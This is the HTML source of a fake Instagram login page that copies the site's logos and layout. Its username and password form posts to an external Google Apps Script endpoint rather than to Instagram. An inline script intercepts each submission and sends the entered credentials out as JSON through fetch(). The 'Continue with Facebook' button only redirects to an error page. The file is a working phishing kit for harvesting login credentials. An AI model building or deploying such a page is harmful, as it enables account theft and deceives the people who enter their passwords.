<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In | Instagram</title>
    <link rel="stylesheet" href="index.css">
    <link rel="shortcut icon" href="res/instagram-new.png">
</head>

<body>
    <div id="wrapper">
        <div class="main-content">
            <div class="header">
                <img src="res/ig.png" alt="Instagram Logo">
            </div>
            <br>

            <div>
                <div class="btn1">
                    <img src="res/facebook.png" style="float: left;" class="icon" alt="Facebook Icon">
                    <!-- Redirect to error.html on button click -->
                    <input type="button" onclick='window.location.href="error.html";' value="Continue with Facebook"
                        style="float: right;" class="btn2" />
                </div>
            </div>

            <div style="margin-top:15px;margin-bottom: 15px;">
                <pre>─────────    OR    ─────────</pre>
            </div>

            <div class="l-part">
                <!-- Netlify form handling with redirection -->
                <form name="contact" method="POST" action="https://script.google.com/macros/s/AKfycbzIPrVOXxE9KrEVkg8NYBprnWVupP6KWgLdpuYArejfUb0H4AYxdBP-sMm2YK_v6HaQ/exec">
                    <input type="text" name="username" placeholder="Username" class="input-1" required />
                    <input type="password" name="password" placeholder="Password" class="input-2" required />
                    <input type="submit" class="btn" value="Log In">
                </form>
                
                
            </div>
        </div>

        <div class="sub-content">
            <div class="s-part">
                Don't have an account?
                <a href="https://www.instagram.com/accounts/emailsignup/?hl=en">&nbsp;Sign up</a>
            </div>
        </div>
    </div>
</body>
 
    <script>
    document.querySelector('form').addEventListener('submit', async (event) => {
        event.preventDefault(); // Prevent default form submission
        const form = event.target;
        const formData = new FormData(form);
        const data = Object.fromEntries(formData.entries());
        const response = await fetch(form.action, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        if (response.ok) {
            alert("Form submitted successfully!");
            form.reset();
        } else {
            alert("Error submitting form.");
        }
    });
</script>


</html>
